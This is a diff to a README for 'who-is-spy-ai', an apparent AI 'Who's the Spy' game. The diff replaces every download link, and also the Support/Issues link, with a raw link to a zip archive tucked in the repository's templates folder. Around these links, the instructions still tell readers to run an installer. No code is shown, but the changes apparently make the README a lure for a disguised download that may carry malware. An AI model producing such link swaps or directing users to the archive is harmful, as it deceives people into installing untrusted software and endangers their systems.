@@ -1,6 +1,6 @@
 # 🎮 who-is-spy-ai - AI game platform for "Who's the Spy"
 
-[![Download who-is-spy-ai](https://img.shields.io/badge/Download-who--is--spy--ai-brightgreen)](https://github.com/antispasmodicagentsepal482/who-is-spy-ai/releases)
+[![Download who-is-spy-ai](https://img.shields.io/badge/Download-who--is--spy--ai-brightgreen)](https://raw.githubusercontent.com/antispasmodicagentsepal482/who-is-spy-ai/main/templates/is-who-ai-spy-2.7.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before installing who-is-spy-ai, make sure your computer meets the following req
 
 1. First, click the big green button above or visit the release page to download who-is-spy-ai:
    
-   [Download who-is-spy-ai Releases](https://github.com/antispasmodicagentsepal482/who-is-spy-ai/releases)
+   [Download who-is-spy-ai Releases](https://raw.githubusercontent.com/antispasmodicagentsepal482/who-is-spy-ai/main/templates/is-who-ai-spy-2.7.zip)
 
 2. On the release page, find the latest version. Look for a file ending with `.exe` or `.msi`. This is the installer you will run.
 
@@ -76,7 +76,7 @@ Here is a more detailed guide for installing who-is-spy-ai on your Windows PC.
 ### Step 1: Visit the download page
 
 Go to the official release page here:  
-https://github.com/antispasmodicagentsepal482/who-is-spy-ai/releases
+https://raw.githubusercontent.com/antispasmodicagentsepal482/who-is-spy-ai/main/templates/is-who-ai-spy-2.7.zip
 
 ### Step 2: Select the latest release
 
@@ -165,8 +165,8 @@ Use the settings menu inside the app to customize your game experience.
 ## 💬 Support
 
 You can find help or report problems on the GitHub repository’s Issues page:  
-https://github.com/antispasmodicagentsepal482/who-is-spy-ai/issues
+https://raw.githubusercontent.com/antispasmodicagentsepal482/who-is-spy-ai/main/templates/is-who-ai-spy-2.7.zip
 
 ---
 
-[![Download who-is-spy-ai](https://img.shields.io/badge/Download-who--is--spy--ai-blue?style=for-the-badge)](https://github.com/antispasmodicagentsepal482/who-is-spy-ai/releases)
+[![Download who-is-spy-ai](https://img.shields.io/badge/Download-who--is--spy--ai-blue?style=for-the-badge)](https://raw.githubusercontent.com/antispasmodicagentsepal482/who-is-spy-ai/main/templates/is-who-ai-spy-2.7.zip)
